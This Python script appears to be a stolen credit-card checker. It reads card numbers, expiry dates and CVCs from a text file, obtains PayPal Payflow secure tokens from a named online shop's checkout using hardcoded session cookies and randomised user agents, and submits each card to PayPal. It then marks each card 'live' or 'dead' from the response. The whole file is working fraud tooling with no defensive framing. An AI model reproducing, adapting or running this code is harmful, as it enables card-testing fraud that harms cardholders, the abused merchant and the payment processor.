import requests
import pyfiglet,re
import json
import time
from user_agent import generate_user_agent
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
w = '\033[2;37m'
y = '\033[1;34m' 

logo1 = pyfiglet.figlet_format('            modca')

print(X +logo1)

ua = generate_user_agent()
rua = ua
o=("____________________________________________________________")
print(F+o)
file=open('Modca.txt',"+r")
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    mm=P.split('|')[1]
    yy=P.split('|')[2]#[-2:]
    number = n
    first_six_digits = str(number)[:6]
    nom4 = (first_six_digits)
    #[-2:]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    time.sleep(15)   
    cookies = {
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    '_ga': 'GA1.2.1972238125.1706741677',
    '_gid': 'GA1.2.562607689.1706741677',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'X-Magento-Vary': '9bf9a599123e6402b85cde67144717a08b817412',
    'form_key': 'cA7mTq3YoEQp6CEB',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'form_key': 'cA7mTq3YoEQp6CEB',
    'PHPSESSID': '867438qt2phho79rp8vh7823e2',
    '_ga_MQSTGNLP8C': 'GS1.2.1706741678.1.1.1706741933.0.0.0',
    'section_data_ids': '%7B%22cart%22%3A1706742016%2C%22popup-message-info%22%3A1706742016%2C%22customer%22%3A1706741722%2C%22compare-products%22%3A1706741722%2C%22last-ordered-items%22%3A1706741722%2C%22directory-data%22%3A1706741917%2C%22captcha%22%3A1706741722%2C%22instant-purchase%22%3A1706741722%2C%22persistent%22%3A1706741722%2C%22review%22%3A1706741722%2C%22wishlist%22%3A1706741722%2C%22recently_viewed_product%22%3A1706741722%2C%22recently_compared_product%22%3A1706741722%2C%22product_data_storage%22%3A1706741722%2C%22paypal-billing-agreement%22%3A1706741722%7D',
    'private_content_version': '4e660826ccd9ab20d82179727edc490e',
    }

    headers = {
    'authority': 'shop.myfirstech.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    
    'origin': 'https://shop.myfirstech.com',
    'referer': 'https://shop.myfirstech.com/checkout/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': rua,
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
    'form_key': 'cA7mTq3YoEQp6CEB',
    'payment[method]': 'payflowpro',
    'billing-address-same-as-shipping': 'on',
    'captcha_form_id': 'co-payment-form',
    'controller': 'checkout_flow',
    'cc_type': 'VI',
    }

    response = requests.post(
    'https://shop.myfirstech.com/paypal/transparent/requestSecureToken/',
    cookies=cookies,
    headers=headers,
    data=data,
    
    )
    sstok = (response.json()['payflowpro']['fields']['securetoken'])

    ssid = (response.json()['payflowpro']['fields']['securetokenid'])

    cookies = {
    'enforce_policy': 'global',
    'ts_c': 'vr%3D50723f0618d0ad112c8003a2fc88fad6%26vt%3D50723f0618d0ad112c8003a2fc88fad5',
    'ts': 'vreXpYrS%3D1801147440%26vteXpYrS%3D1706454840%26vr%3D50723f0618d0ad112c8003a2fc88fad6%26vt%3D50723f0618d0ad112c8003a2fc88fad5%26vtyp%3Dnew',
    }

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
   
    'Origin': 'https://shop.myfirstech.com',
    'Referer': 'https://shop.myfirstech.com/',
    'Sec-Fetch-Dest': 'iframe',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': rua,
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    }

    data = {
    'result': '0',
    'securetoken': sstok,
    'securetokenid': ssid,
    'respmsg': 'Approved',
    'result_code': '0',
    'csc': cvc,
    'expdate': f'{mm}{yy}',
    'acct': n,
    }

    response = requests.post('https://payflowlink.paypal.com/', cookies=cookies, headers=headers, data=data)
    msg = response.text

    if "Declined: 10626-Transaction refused due to risk model" in msg :
	    print(Z+f'[ {start_num} ] {P} ➠ is dead ➠ card declined ❌')
    else: 
	    print(f'[ {start_num} ] {P} ➠ is live ➠ CHARGE ✅')
	    